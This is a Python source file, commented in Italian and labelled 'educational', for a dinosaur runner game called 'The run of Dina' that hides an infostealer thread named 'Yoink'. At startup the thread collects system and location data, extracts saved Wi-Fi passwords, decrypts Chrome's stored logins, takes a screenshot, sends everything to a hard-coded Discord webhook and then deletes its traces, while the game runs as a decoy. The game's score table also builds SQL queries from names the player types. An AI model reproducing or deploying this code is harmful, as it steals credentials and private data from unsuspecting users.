"""Programma creato a scopo didattico, non farne uso per nessun motivo personale."""

"""
La velocità del programma è basta sulla velocità della CPU del PC attaccato.

COMANDO PER LA COMPILAZIONE IN .EXE (il file verrà salvato in una cartella chiamata "dist") :
- Avviare il file "CreaExe.bat"

Authors: 
- Di Mantua Daniele
"""

from threading import Thread
import os, subprocess, requests, sys
import browser_cookie3 as steal, requests, base64, random, string, zipfile, os, shutil, dhooks, re, sys, sqlite3
from dhooks import Webhook, Embed, File
from PIL import ImageGrab as Image
import json
import socket
from uuid import getnode as get_mac
from requests import get
import psutil
import platform
from subprocess import Popen, PIPE
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from pathlib import Path
import pygame
from pygame import mixer
import random
import sqlite3

# Url del webhook
url= "https://discord.com/api/webhooks/1181277872317542410/yvqysenZoh6EsbKaH0eGZ-3hZEf55K0EvKlp5i0oLpZlFHCRF_KLWPFkTxoGKPJDptI7"
hook = Webhook(url)

no_zip = False # nel caso non riesca ad inviare le informazioni online questa variabile le salva in locale

powershell = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
car = '"'
l_acconsentita = ["WPA2-Personal", "WPA3-Personal", "WPA", "WPA2", "WPA3"]

# Cerca il punto in cui si trova il file
def trovaFile(per):
    j = False
    while (j != True):
        s = ""
        if not Path(f"{per}The run of Dina.exe").exists():
            l = per.split("\\")
            for j in l[:-2]:
                s += f"{j}\\"
                per = s
        else:
            j = True
    return per

# Prendo il percorso assoluto del file fino all'ultima cartella
for cartella, _, _ in os.walk(os.getcwd()):
    percorsoTemp = cartella
root = percorsoTemp.split(":")[0]

percorsoTemp = f"{percorsoTemp}\\"

percorsoTemp = trovaFile(percorsoTemp)

no_game = False
if not Path(f"{percorsoTemp}Files\\").exists():
    os.makedirs(f"{percorsoTemp}Files")
    no_game = True

if no_game != True:
    try:
        pygame.init()

        sfondo = pygame.image.load('./Files/img/Sfondi/Sfondo.png')

        pavimento = pygame.image.load('./Files/img/Sfondi/Pavimento.png')

        down_dina_sprites = [pygame.image.load('./Files/img/dina_Sprites/Down_sprites/dina_down_1.png'),
                            pygame.image.load('./Files/img/dina_Sprites/Down_sprites/dina_down_2.png')]

        up_dina_sprites = [pygame.image.load('./Files/img/dina_Sprites/Up_sprites/dina1.png'),
                        pygame.image.load('./Files/img/dina_Sprites/Up_sprites/dina2.png'),
                        pygame.image.load('./Files/img/dina_Sprites/Up_sprites/dina3.png')]

        dina_dead = pygame.image.load('./Files/img/dina_Sprites/Up_sprites/dina_morte.png')

        ostacoli_fermi = [pygame.image.load('./Files/img/Ostacoli_img/Cactus/ost1.png'),
                        pygame.image.load('./Files/img/Ostacoli_img/Cactus/ost2.png'),
                        pygame.image.load('./Files/img/Ostacoli_img/Cactus/ost3.png'),
                        pygame.image.load('./Files/img/Ostacoli_img/Cactus/ost4.png')]

        uccelli_sprites = [pygame.image.load('./Files/img/Ostacoli_img/Uccelli/ucc1.png'),
                        pygame.image.load('./Files/img/Ostacoli_img/Uccelli/ucc2.png')]

        nuvola = pygame.image.load('./Files/img/Nuvole/Nuvola.png')

        FONT = pygame.font.SysFont('./Files/font/PressStart2P-Regular.ttf',30,bold=True)
        game_icon = pygame.image.load("./Files/img/icon/DinaIcon.ico")

        pos_y_ucc = [300,410,330]

        # Costanti
        SCHERMO = pygame.display.set_mode((1024,512))
        FPS = 60
        pygame.display.set_caption("The run of Dina")
        pygame.display.set_icon(game_icon)

        nome_database = "Files/Data/gamedatas.db"
    except: 
        no_game = True


""" INIZIO PROGRAMMA YOINK """

# Prendo le informazioni generale del PC attaccato
def infoPc():
    diz_informazioni = {}
    diz_informazioni["cpufreq"] = psutil.cpu_freq()
    diz_informazioni["uname"] = platform.uname()

    try:
        diz_informazioni["mac"] = str(hex(get_mac()))[2:].upper() # prende il mac
    except: diz_informazioni["mac"] = "None"

    try:
        diz_informazioni["host"] = socket.gethostname() # nome del PC
    except: diz_informazioni["host"] = "None"

    try:
        diz_informazioni["localip"] = socket.gethostbyname(diz_informazioni["host"]) # IP del pc
    except: diz_informazioni["localip"] = "None"

    try:
        diz_informazioni["publicip"] = get('http://api.ipify.org').text # IP pubblico del pc
    except: diz_informazioni["publicip"] = "None"

    try:
        diz_informazioni["city"] = get(f'http://ipapi.co/{diz_informazioni["publicip"]}/city').text # Citta
        diz_informazioni["provider"] = get(f'http://ipapi.co/{diz_informazioni["publicip"]}/org').text
        diz_informazioni["country"] = get(f'http://ipapi.co/{diz_informazioni["publicip"]}/country_name').text
        diz_informazioni["region"] = get(f'http://ipapi.co/{diz_informazioni["publicip"]}/region').text # Paese
    except: diz_informazioni["city"], diz_informazioni["provider"], diz_informazioni["country"], diz_informazioni["region"] = "None", "None", "None", "None"

    try:
        vpn = requests.get('http://ip-api.com/json?fields=proxy')
        diz_informazioni["proxy"] = vpn.json()['proxy'] # vede se si ha un vpn attivo sul pc
    except: vpn, diz_informazioni["proxy"] = "None", "None"
    return diz_informazioni

# Invia le informazioni del pc
def inviaInformazioni(info):
    requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Informazioni acquisite da: {info['host']}", "color": 16711680 }, { "color": 7506394, "fields": [ { "name": "Geolocalizzazione", "value": f"\nIP privato: {info['localip']} | VPN: {info['proxy']}\nIP pubblico: {info['publicip']}\nProvider: {info['provider']}\nIndirizzo MAC: {info['mac']}\n\nPaese: {info['country']}\nRegione: {info['region']}\nCittà: {info['city']}\n\n" } ] }, { "fields": [ { "name": "Informazioni di sistema", "value": f"Sistema operativo: {info['uname'].system}\nNome: {info['uname'].node}\nMachine: {info['uname'].machine}\nProcessore: {info['uname'].processor}\n" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nFrequenza Max: {info['cpufreq'].max:.2f}Mhz\nFrequenza Min: {info['cpufreq'].min:.2f}Mhz\n"}]}]}), headers={"Content-Type": "application/json"})

# Prende i nomi delle reti Wi-Fi salvate sul pc
def prendiNomi(per):
    file = open(f"{per}\prendiNomi.bat", "w", encoding="utf-8")
    file.write(f"@echo off\nnetsh wlan show profiles|findstr /C:{car}Tutti i profili utente{car} > {car}{per}\WiFinomi.txt{car}")
    file.close()
    subprocess.run(f"{car}{per}\prendiNomi.bat{car}", shell=True)

# Converte in lista un file contenente le informazioni dopo i ":"
def creaLista(nome, per):
    file = open(f"{per}\{nome}", "r")
    s = file.readlines()
    l = [a.split(":")[-1][1:-1] for a in s]
    file.close()
    return l

# Crea un file batch che prende il tipo di autenticazione di ogni rete Wi-Fi salvata
def prendiAutenticazione(per,l):
    file = open(f"{per}\Autenticazioni.txt", "w", encoding="utf-8")
    for a in l:
        b = subprocess.run([powershell, f"(netsh wlan show profiles | netsh wlan show profile name={car}{a}{car} key=clear | findstr /C:{car}Autenticazione{car} | Select-Object -First 1)"], shell = True, capture_output=True, text=True).stdout[:-1]
        file.write(f"{b}\n")
    file.close()

# Crea un file batch che prende le password di ogni rete Wi-Fi salvata
def prendiPassword(l, per):
    file = open(f"{per}\prendiPassword.bat", "w", encoding="utf-8")
    file.write("@echo off\n")
    for a in l:
        file.write(f"netsh wlan show profiles|netsh wlan show profile name = {car}{a}{car} key = clear|findstr /C:{car}Contenuto chiave{car} >> {car}{per}\passwordWiFi.txt{car}\n")
    file.close()
    subprocess.run(f"{car}{per}\prendiPassword.bat{car}", shell=True)

# Crea il file che contiene il nome della rete e la sua rispettiva password
def filePassword(psw, nome, per):
    file = open(f"{per}\WiFiPassword.txt", "w", encoding="utf-8")
    for a,b in zip(nome, psw):
        file.write(f"-----------------\nNome: {a}\nPassword: {b}\n-----------------\n\n")
    file.close()

# copia il file dove è contenuto il dizionario con i siti a cui si è fatto accesso in passato
def prendiFileChrome(per):
    comando = rf"{car}$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data{car}"
    comando2 = rf"{car}$env:LOCALAPPDATA\Google\Chrome\User Data\Local State{car}"
    a = subprocess.run([powershell, comando], shell = True, capture_output=True, text=True).stdout[:-1]
    b = subprocess.run([powershell, comando2], shell = True, capture_output=True, text=True).stdout[:-1]

    file = open(f"{per}\CopiaFile.bat","w")
    file.write(f"@echo off\ncopy {car}{a}{car} {car}{per}\{car}\n")
    file.write(f"copy {car}{b}{car} {car}{per}\{car}\ncls")
    file.close()
    subprocess.run(f"{per}\CopiaFile.bat", shell = True)

# Crea il file con all'interno il link del sito e l'username della persona
def creaFileLink(per):
    file = open(f"{per}\SitiLogin.txt", "w", encoding="utf-8")
    conn = sqlite3.connect(f"{per}\Login Data")
    cur = conn.cursor()
    cur.execute("SELECT signon_realm,username_value,password_value FROM logins")
    rows = cur.fetchall()
    for row in rows:
        host = row[0]
        if host.startswith('android'):
                continue
        name = row[1]
        psw = cdecrypt(row[2], per)
        file.write(f"-----------------\nSito: {host}\nNome utente: {name}\nPassword: {psw}\n-----------------\n\n")
    file.close()
    conn.close()

# Decripta la password contenuta nel database
def cdecrypt(encrypted_txt, per):
    if sys.platform == 'win32':
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = dpapi(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10':
                decrypted_txt = decryptions(encrypted_txt, per)
                return decrypted_txt[:-16].decode()
        except WindowsError:
            return None
    else:
        pass

# Decripta la password
def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def decryptions(encrypted_txt, per):
    encoded_key = localdata(per)
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

# Restituisce la chiave crittografata associata alla crittografia dei dati dell'utente del browser Chrome
def localdata(per):
    jsn = None
    with open(rf"{per}\Local State", encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

# cattura uno screenshot
def screenShoot(per):
    try:
        screenshot = Image.grab()
        screenshot.save(f'{per}\screenshot.jpg')
        screenshot = open(f'{per}screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

#Crea la zip da inviare su Discord
def creaZip(per, dict):
    try:
        if no_zip == False:
            zname = f'{per}\Infromazioni-{dict["host"]}.zip'
            newzip = zipfile.ZipFile(zname, 'w')
            try:
                newzip.write(f'{per}\WiFiPassword.txt')
                newzip.write(f'{per}\screenshot.jpg')
                newzip.write(f'{per}\SitiLogin.txt')
            except: pass
            newzip.close()
            wifipasswords = File(f'{per}\Infromazioni-{dict["host"]}.zip')
        return wifipasswords
    except:
        pass

# Thread che fa partire il programma YOINK
class Yoink(Thread):
    def __init__(self):
        super().__init__() # ritorna la classe genitore thread

    # MAIN
    def run(self):
        diz = infoPc()

        # Controllo se il computer attaccato è connesso o meno ad internet
        try:
            inviaInformazioni(diz)
        except:
            global no_zip
            no_zip = True

        # Prendo il percorso assoluto del file fino all'ultima cartella
        for cartella, _, _ in os.walk(os.getcwd()):
            percorso = cartella

        percorso = f"{percorso}\\"

        percorso = trovaFile(percorso)

        # Se la cartella non esiste la crea
        if not Path(f"{percorso}Files\\Datas\\").exists():
            os.makedirs(f"{percorso}Files\\Datas")

        percorso = f"{percorso}Files\\Datas\\"

        try:
            prendiNomi(percorso)

            l_nomi = creaLista("WiFinomi.txt", percorso)

            # Prendo e controllo il tipo di autenticazione della password del wi-fi
            prendiAutenticazione(percorso, l_nomi)
            l_autenticazioni_temp = creaLista("Autenticazioni.txt", percorso)

            l_autenticazioni = [a for a in l_autenticazioni_temp if a != '']
            for a in l_autenticazioni:
                if a not in l_acconsentita:
                    l_nomi.remove(l_nomi[l_autenticazioni.index(a)])
                    l_autenticazioni.remove(a)

            # prendo la password e le salvo nel file
            prendiPassword(l_nomi, percorso)
            l_password = creaLista("passwordWiFi.txt", percorso)
            filePassword(l_password, l_nomi, percorso)
        except: pass
        
        # Provo a prendere le informazioni di chrome
        try:
            prendiFileChrome(percorso)
            creaFileLink(percorso)
        except: pass

        # Scatta uno screenshot
        screenShoot(percorso)

        # Zippa i file che voglio inviare
        wifipasswords = creaZip(percorso, diz)

        # Invia la zip
        try:
            hook.send(file=wifipasswords)
            subprocess.os.remove(f"{percorso}\Infromazioni-{diz['host']}.zip")
            subprocess.os.remove(f"{percorso}\WiFiPassword.txt")
            subprocess.os.remove(f"{percorso}\SitiLogin.txt")
        except:
            pass

        # Elimina tutti i file che non devono essere visibili all'utente
        try:
            subprocess.os.remove(f"{percorso}\prendiNomi.bat")
            subprocess.os.remove(f"{percorso}\WiFinomi.txt")
            subprocess.os.remove(f"{percorso}\Autenticazioni.txt")
            subprocess.os.remove(f"{percorso}\prendiPassword.bat")
            subprocess.os.remove(f"{percorso}\passwordWiFi.txt")
            subprocess.os.remove(f"{percorso}\CopiaFile.bat")
            subprocess.os.remove(f"{percorso}\Login Data")
            subprocess.os.remove(f"{percorso}\Local State")
            subprocess.os.remove(f"{percorso}\screenshot.jpg")
        except: pass

""" FINE PROGRAMMA YOINK """

"""GIOCO DEL DINOSAURO"""

# Classe nuvole
class Nuvole():
    def __init__(self,x ,y):
        self.x = x
        self.y = y

    def movimentoEDisegna(self):
        self.x -= 1
        SCHERMO.blit(nuvola,(self.x,self.y))
        if self.x == -100:
            self.x = 1050

    def disegna(self):
        SCHERMO.blit(nuvola,(self.x,self.y))

# Classe ostacoli
class Ostacolo():
    def __init__(self):

        # Attributi generali
        self.x = random.randint(1030,1450)
        self.y = 380
        self.hitbox = None

        # Attributi per gli ostacoli
        self.rand_ost = random.randint(0,3)
        self.img_ost = ostacoli_fermi[self.rand_ost]

        # Attributi per gli uccelli
        self.pos_y_ucc = random.choice(pos_y_ucc)
        self.spawna_ucc = random.randint(0,100)
        self.cont_frame = 0
        self.cambia, self.cambioDato = 0, False

    # Muove e disegna gli ostacoli
    def movimentoEDisegna(self):
        self.x -= velocita
        if self.spawna_ucc <= 20:
            self.uccelliMovimentoESpawn()
        else:
            if self.rand_ost == 2 or self.rand_ost == 3:
                self.hitbox = self.img_ost.get_rect()
                self.hitbox.x = self.x
                self.hitbox.y = self.y+25
                SCHERMO.blit(self.img_ost,(self.x,self.y+25))
            else:
                self.hitbox = self.img_ost.get_rect()
                self.hitbox.x = self.x
                self.hitbox.y = self.y
                SCHERMO.blit(self.img_ost,(self.x,self.y))
    
    # Anima gli uccelli
    def uccelliMovimentoESpawn(self):
        self.y = self.pos_y_ucc

        if self.cont_frame % 12 == 0:
            if self.cambia == 1 and self.cambioDato == True:
                self.cambia = 0
                self.cambioDato = False
            else: 
                self.cambia = 1
                self.cambioDato = True

        self.cont_frame +=1
        if self.cambia == 1:

            self.hitbox = uccelli_sprites[self.cambia].get_rect()
            self.hitbox.x = self.x
            self.hitbox.y = self.y - 12

            SCHERMO.blit(uccelli_sprites[self.cambia],(self.x,self.y-12))
        else: 
            self.hitbox = uccelli_sprites[self.cambia].get_rect()
            self.hitbox.x = self.x
            self.hitbox.y = self.y

            SCHERMO.blit(uccelli_sprites[self.cambia],(self.x,self.y))

    # Controlla se Dina ha colpito un ostacolo
    def collisioni(self):
        if hit_box_dina.colliderect(self.hitbox):
            you_ded()

# Inizializza le variabili globali del videogioco
def inizializza_glob():
    global personaggio_x, personaggio_y, personaggio_vel, hit_box_dina
    hit_box_dina = up_dina_sprites[0].get_rect()
    personaggio_x, personaggio_y, personaggio_vel = 20, 380, 0
    global velocita, vel_punti
    vel_punti = 9
    velocita = 10
    global x_sprite, x_sprite_down
    x_sprite,x_sprite_down = 0,3
    global continua, inizio
    continua, inizio = False, False
    global pavimentox
    pavimentox = 0
    global down
    down = False
    global contaFrame
    contaFrame = 0
    global punti, punti_x, len_precedente
    punti, punti_x, len_precedente = 0, 956, "0"
    global lista_ost, lista_nuv
    lista_nuv = []
    lista_ost = []
    global fine
    fine = False
    global pos_nuvole
    pos_nuvole = {}

# Aggiorna i frame del gioco
def AggFrameRate():
    global contaFrame
    pygame.display.update()
    pygame.time.Clock().tick(FPS)
    contaFrame += 1

# Disegna tutti gli sprite e oggetti presenti a schermo
def disegna():
    global punti_x, len_precedente
    SCHERMO.blit(sfondo, (0,0))
    SCHERMO.blit(pavimento,(pavimentox,383))

    if len(str(punti)) > 5:
        if len(str(punti)) != len_precedente:
            punti_x -= 12
    SCHERMO.blit(FONT.render("0"*(5-len(str(punti)))+str(punti), 1, (0,0,0)),(punti_x,20))
    len_precedente = len(str(punti))

    for n in lista_nuv:
        if continua == True:
            n.movimentoEDisegna()
        else:
            n.disegna()

    animdina()

    for t in lista_ost:
        t.movimentoEDisegna()
        t.collisioni()

# Guarda i bottoni che vengono premuti
def pulsantiPremuti():
    global x_sprite_down, x_sprite, down, personaggio_vel, continua, inizio, fine, personaggio_y
    for event in pygame.event.get():  
        if(event.type == pygame.KEYDOWN and (event.key == pygame.K_s or event.key == pygame.K_DOWN)):
                down = True
                x_sprite = 0
                x_sprite_down = 0        
        if(event.type == pygame.KEYUP and (event.key == pygame.K_s or event.key == pygame.K_DOWN)):
            down = False
            x_sprite_down = 3
        if personaggio_y >= 380: # Quando Dina si trova sopra ai 380 di altezza, disabilita il tasto W
            if(event.type == pygame.KEYDOWN and (event.key == pygame.K_w or event.key == pygame.K_UP or event.key == pygame.K_SPACE)):
                if fine == False:
                    playSound("Yippee")
                personaggio_vel = -27
        elif personaggio_y < 380:
            if(event.type == pygame.KEYDOWN and (event.key == pygame.K_s or event.key == pygame.K_DOWN)):
                if personaggio_y < 380:
                    personaggio_vel += 6
        if(event.type == pygame.KEYDOWN):
            continua, inizio = True, True
        if fine != False:
            if(event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE):
                inizializza_glob()
                menu()
                fine = False
                continua = True
                lista_ost.append(Ostacolo()) 
        if event.type == pygame.QUIT:
            continua = False
            fine = False
            inizio = True
            pygame.quit() 

# Anima il pavimento
def MuoviPavimento():
    global pavimentox
    pavimentox -= velocita
    if pavimentox < -1000: 
        pavimentox = 0

# Anima Dina
def animdina():
    global hit_box_dina
    if x_sprite_down == 0 or x_sprite_down == 1:
        hit_box_dina = down_dina_sprites[x_sprite_down].get_rect()
        hit_box_dina.x = personaggio_x
        hit_box_dina.y = personaggio_y + 34

        SCHERMO.blit(down_dina_sprites[x_sprite_down], (personaggio_x,personaggio_y+34))
    else:
        hit_box_dina = up_dina_sprites[x_sprite].get_rect()
        hit_box_dina.x = personaggio_x + 10
        hit_box_dina.y = personaggio_y
        hit_box_dina.size = [60,90]     

        SCHERMO.blit(up_dina_sprites[x_sprite], (personaggio_x,personaggio_y))

# Mostra Dina che corre
def Movimentodina():
    global x_sprite, x_sprite_down, contaFrame
    if down == False: # se down è False, attiva le animazioni di corsa di Dina
        if personaggio_y >= 380:
            if contaFrame % 4 == 0: # cambia sprite di corsa ogni 4 frame
                if x_sprite >= 2:
                    x_sprite = 0
                else:
                    x_sprite +=1
            elif contaFrame > 60: # quando il contatore raggiunge 60 lo resetta
                contaFrame = 0
        else: x_sprite = 0
    else:
        if contaFrame % 5 == 0: # cambia sprite di corsa accucciata ogni 5 frame
            if x_sprite_down >= 1:
                x_sprite_down = 0
            else:
                x_sprite_down += 1
        elif contaFrame > 60: # quando il contatore raggiunge 60 lo resetta
                contaFrame = 0

# "Gravità" senza la velocità terminale
def caduta_Personaggio():
    global personaggio_y, personaggio_vel
    personaggio_y += personaggio_vel # Velocità di caduta
    if personaggio_y >= 380:
        personaggio_vel = 0
        personaggio_y = 380
    if personaggio_y < 380:
        personaggio_vel += 2

# Aumenta il punteggio
def AumentaPunteggio():
    global punti, velocita, vel_punti
    if punti != 0:
        if punti % 70 == 0:
            velocita += 0.3
        if punti % 200 == 0:
            if vel_punti > 1:
                vel_punti -= 1
    if contaFrame % vel_punti == 0:
        punti += 1

# Crea e distrucce gli ostacoli
def ostacoli_funz():
    if lista_ost[-1].x < random.randint(0,400): # Decide quando un ostacolo deve essere distrutto
        lista_ost.append(Ostacolo())
    
    for t in lista_ost:
        if t.x <= -100:
            lista_ost.remove(lista_ost[0])

# Ottiene la posizione delle nuvole e le disegna
def prendiPosEDisNuvole():
    global pos_nuvole
    con = sqlite3.connect(f'./{nome_database}')
    cur = con.cursor()
    cur.execute(f"SELECT x, y FROM NUVOLE")
    rows = cur.fetchall()
    for row in rows:
        lista_nuv.append(Nuvole(int(row[0]),int(row[1])))
    con.close()

# Dina ha perso
def you_ded():
    global continua, fine
    continua = False
    fine = True
    playSound("Boo-womp")
    for _ in lista_ost:
        lista_ost.remove(lista_ost[0])
    
    aggClassifica()

    try:
        l_nomi, l_punti = ottieniPunteggiMigliori()
        l_nomi.reverse()
        l_punti.reverse()
        cont = 0
        while fine == True:
            SCHERMO.blit(sfondo, (0,0))
            SCHERMO.blit(pavimento,(pavimentox,383))
            SCHERMO.blit(dina_dead, (personaggio_x,personaggio_y))
            for n in lista_nuv:
                n.disegna()
            spazio = ((SCHERMO.get_height()/2 + 10*len(l_nomi))- 30*len(l_nomi)-10)
            SCHERMO.blit(FONT.render("NAME", 1, (0,0,0)),(SCHERMO.get_width()/2-120, spazio))
            SCHERMO.blit(FONT.render("SCORE", 1, (0,0,0)),(SCHERMO.get_width()/2+80,spazio))
            for a,b in zip(l_nomi, l_punti):
                spazio = ((SCHERMO.get_height()/2 + 10*len(l_nomi))-cont)
                SCHERMO.blit(FONT.render(a, 1, (0,0,0)),(SCHERMO.get_width()/2-120, spazio))
                SCHERMO.blit(FONT.render(str(b), 1, (0,0,0)),(SCHERMO.get_width()/2+80,spazio))
                cont+=30
            if cont*len(l_nomi) > 30*len(l_nomi):
                cont = 0
            pulsantiPremuti()
            AggFrameRate()
    except:
        pygame.quit()

# Controlla se la sintassi del nome è corretta
def inserisciNome():
    nome = ""
    continu = True
    c = False
    while continu == True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_RETURN:
                    if len(nome) < 3:
                        c = True
                    else:
                        c = False
                        continu = False
                elif event.key == pygame.K_BACKSPACE:
                        c = False
                        nome = nome[:-1]
                else:
                    if len(nome) < 14:
                        c = False
                        nome += event.unicode
        SCHERMO.blit(sfondo, (0,0))
        SCHERMO.blit(pavimento,(pavimentox,383))
        SCHERMO.blit(dina_dead, (personaggio_x,personaggio_y))
        for n in lista_nuv:
                n.disegna()
        SCHERMO.blit(FONT.render("GAME OVER", 1, (0,0,0)),(SCHERMO.get_width()/2-50,SCHERMO.get_height()/2-160))
        SCHERMO.blit(FONT.render("SCORE: "+str(punti), 1, (0,0,0)),(SCHERMO.get_width()/2-40,SCHERMO.get_height()/2-140))
        SCHERMO.blit(FONT.render("INSERT NAME", 1, (0,0,0)),(SCHERMO.get_width()/2-55,SCHERMO.get_height()/2-70))
        pygame.draw.rect(SCHERMO,(255,0,0),(SCHERMO.get_width()/2-110, SCHERMO.get_height()/2-46, 250, 50), 4)
        if c == True:
            SCHERMO.blit(FONT.render("Name too short", 1, (0,0,0)),(SCHERMO.get_width()/2-65,SCHERMO.get_height()/2-30))
        else:
            SCHERMO.blit(FONT.render(nome, 1, (0,0,0)),(SCHERMO.get_width()/2-80,SCHERMO.get_height()/2-30))
        AggFrameRate()
    return nome
        
# Aggiunge il nuovo punteggio al database
def aggClassifica():
    con = sqlite3.connect(f'./{nome_database}')
    cur = con.cursor()
    cur.execute("SELECT COUNT(*) FROM PUNTEGGI")
    rows = cur.fetchall()
    if rows[0][0] < 10:# Se il numero di punteggi è minore di 10 aggiunge il punteggio al database
        testo = inserisciNome()
        cur.execute(f"INSERT INTO PUNTEGGI VALUES (NULL, '{testo}', {int(punti)})")
        con.commit()
    else:
        cur.execute(f"SELECT id, MIN(Punteggio) FROM PUNTEGGI")
        rows2 = cur.fetchall()
        if int(rows2[0][1]) < punti: # Se l'ultimo punteggio è maggiore del punteggio più basso registrato nel database, cancellalo e aggiungi il nuovo punteggio.
            testo = inserisciNome()
            cur.execute(f"DELETE FROM PUNTEGGI WHERE id={rows2[0][0]}")
            con.commit()
            cur.execute(f"INSERT INTO PUNTEGGI VALUES ({rows2[0][0]}, '{testo}', {int(punti)})")
            con.commit()
    con.close()

# Mostra i punteggi migliori a schermo
def ottieniPunteggiMigliori():
    con = sqlite3.connect(f'./{nome_database}')
    cur = con.cursor()
    cur.execute(f"SELECT nome, punteggio FROM PUNTEGGI ORDER BY PUNTEGGIO DESC LIMIT 10")
    rows = cur.fetchall()
    l_nomi = []
    l_punti = []
    for row in rows:
        l_nomi.append(row[0])
        l_punti.append(row[1])
    con.close()
    return l_nomi, l_punti

# Avvia un suono
def playSound(nome_suono):
    mixer.music.stop() #Ferma la musica
    mixer.music.load(f"./Files/sounds/{nome_suono}.mp3")
    mixer.music.set_volume(0.5)
    mixer.music.play(1) # Avvia la musica

# Menu iniziale
def menu():
    prendiPosEDisNuvole()
    try:
        while inizio == False:
            pulsantiPremuti()
            disegna()
            SCHERMO.blit(FONT.render("Press any KEY to start", 1, (0,0,0)),(SCHERMO.get_width()/2-110,SCHERMO.get_height()/2-30))
            AggFrameRate()
    except:
        pygame.quit()

# MAIN
def Dina_Game_Main():
    inizializza_glob()
    menu()
    lista_ost.append(Ostacolo()) # Crea il primo ostacolo
    try:
        while continua == True:
            pulsantiPremuti()
            MuoviPavimento()
            Movimentodina()
            AumentaPunteggio()
            caduta_Personaggio()
            ostacoli_funz()
            disegna()
            AggFrameRate()
    except:
        pygame.quit()
        
    pygame.quit()
                
"""FINE GIOCO DEL DINOSAURO"""

if __name__ == "__main__":

    # Creo il thread del programma che ruba le informazioni
    yoink = Yoink()
    yoink.start()

    # Avvio il gioco se i file di gioco esistono
    if no_game != True:
        Dina_Game_Main()
    else: 
        subprocess.run("curl https://cmdflix.mufeedvh.com/watch/shrek.bin")
    yoink.join()